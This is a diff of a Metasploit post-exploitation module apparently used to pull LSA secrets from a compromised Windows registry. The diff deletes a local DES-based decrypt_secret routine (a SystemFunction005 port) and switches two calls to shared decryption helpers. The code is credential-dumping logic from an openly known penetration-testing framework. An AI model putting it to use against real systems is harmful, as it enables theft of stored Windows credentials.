@@ -30,36 +30,6 @@ class Metasploit3 < Msf::Post
     ))
   end
 
-  def decrypt_secret(secret, key)
-
-    # Ruby implementation of SystemFunction005
-    # the original python code has been taken from Credump
-
-    j = 0
-    decrypted_data = ''
-
-    for i in (0...secret.length).step(8)
-      enc_block = secret[i..i+7]
-      block_key = key[j..j+6]
-      des_key = convert_des_56_to_64(block_key)
-      d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
-
-      d1.padding = 0
-      d1.key = des_key
-      d1o = d1.update(enc_block)
-      d1o << d1.final
-      decrypted_data += d1o
-      j += 7
-      if (key[j..j+7].length < 7 )
-        j = key[j..j+7].length
-      end
-    end
-    dec_data_len = decrypted_data[0].ord
-
-    return decrypted_data[8..8+dec_data_len]
-
-  end
-
   def reg_getvaldata(key,valname)
     v = nil
     begin
@@ -97,11 +67,11 @@ class Metasploit3 < Msf::Post
           if( @vista == 1 )
             #Magic happens here
             sec = sec[0..-1]
-            sec = decrypt_lsa(sec, lkey)[1..-1].scan(/[[:print:]]/).join
+            sec = decrypt_lsa_data(sec, lkey)[1..-1].scan(/[[:print:]]/).join
           else
             #and here
             sec = sec[0xC..-1]
-            sec = decrypt_secret(sec, lkey).scan(/[[:print:]]/).join
+            sec = decrypt_secret_data(sec, lkey).scan(/[[:print:]]/).join
           end
 
           if(sec.length > 0)
